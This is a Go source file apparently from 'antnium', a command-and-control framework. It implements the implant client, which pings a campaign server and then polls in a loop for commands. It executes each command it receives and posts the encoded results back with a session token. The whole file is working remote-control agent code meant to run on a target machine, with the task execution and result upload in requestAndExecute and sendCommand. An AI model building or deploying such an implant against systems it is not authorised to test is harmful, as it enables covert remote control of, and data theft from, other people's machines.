package client

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"github.com/dobin/antnium/model"
	log "github.com/sirupsen/logrus"
)

var ErrNoCommandsFound = errors.New("Server did not return any commands")

type Client struct {
	Config   ClientConfig
	Campaign model.Campaign
	coder    model.Coder

	commandExec CommandExec
}

func NewClient() Client {
	config := MakeClientConfig()
	campaign := model.MakeCampaign()
	coder := model.MakeCoder(campaign)

	w := Client{
		config,
		campaign,
		coder,
		MakeCommandExec(),
	}
	return w
}

func (s *Client) CommandGetUrl() string {
	return s.Campaign.ServerUrl + s.Campaign.CommandGetPath + s.Config.ComputerId
}

func (s *Client) CommandSendUrl() string {
	return s.Campaign.ServerUrl + s.Campaign.CommandSendPath
}

func (s *Client) HttpGet(url string) (*http.Response, error) {
	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("X-Session-Token", s.Campaign.ApiKey)
	res, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	return res, nil
}

func (s *Client) HttpPost(url string, data *bytes.Reader) (*http.Response, error) {
	client := &http.Client{}
	req, err := http.NewRequest("POST", url, data)
	if err != nil {
		return nil, err
	}
	req.Header.Set("X-Session-Token", s.Campaign.ApiKey)
	res, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	return res, nil
}

func (s *Client) Start() {
	s.sendPing()
	for {
		gotCommand := s.requestAndExecute()
		if !gotCommand {
			time.Sleep(3 * time.Second)
		}
	}
}

func (s *Client) sendPing() {
	arguments := make(model.CmdArgument)
	arguments["msg"] = "ooy!"
	response := make(model.CmdResponse)
	command := model.NewCommand("ping", s.Config.ComputerId, "0", arguments, response)
	s.sendCommand(command)
}

func (s *Client) requestAndExecute() bool {
	command, err := s.GetCommand()
	if err != nil {
		if err == ErrNoCommandsFound {
			fmt.Print(".")
			return false // no news, sleep
		}

		log.WithFields(log.Fields{
			"error": err,
		}).Debug("Error get command")
		return false // if there is a broken command on server, dont flood him
	}

	err = s.commandExec.execute(&command)
	if err != nil {
		log.WithFields(log.Fields{
			"command": command,
			"error":   err,
		}).Info("Error executing command")
		return true // we still got a command
	}

	err = s.sendCommand(command)
	if err != nil {
		log.WithFields(log.Fields{
			"command": command,
			"error":   err,
		}).Info("Error sending command")
		return true // we still got a command
	}
	return true // got a command
}

func (s *Client) GetCommand() (model.CommandBase, error) {
	url := s.CommandGetUrl()
	resp, err := s.HttpGet(url)
	if err != nil {
		return model.CommandBase{}, fmt.Errorf("Error requesting URL %s with error %s", url, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return model.CommandBase{}, fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return model.CommandBase{}, fmt.Errorf("Error reading body of URL %s with error %s", url, err)
	}

	if len(bodyBytes) <= 0 {
		return model.CommandBase{}, ErrNoCommandsFound
	}
	command, err := s.coder.DecodeData(bodyBytes)
	if err != nil {
		return model.CommandBase{}, fmt.Errorf("Error decoding body of URL %s with error %s", url, err)
	}
	return command, nil
}

func (s *Client) sendCommand(command model.CommandBase) error {
	url := s.CommandSendUrl()

	// Setup response
	command.ComputerId = s.Config.ComputerId
	json, err := json.Marshal(command)
	if err != nil {
		return err
	}

	log.WithFields(log.Fields{
		"command": string(json),
	}).Info("Send Command")

	data, err := s.coder.EncodeData(command)
	if err != nil {
		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
	}

	resp, err := s.HttpPost(url, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}

	return nil
}
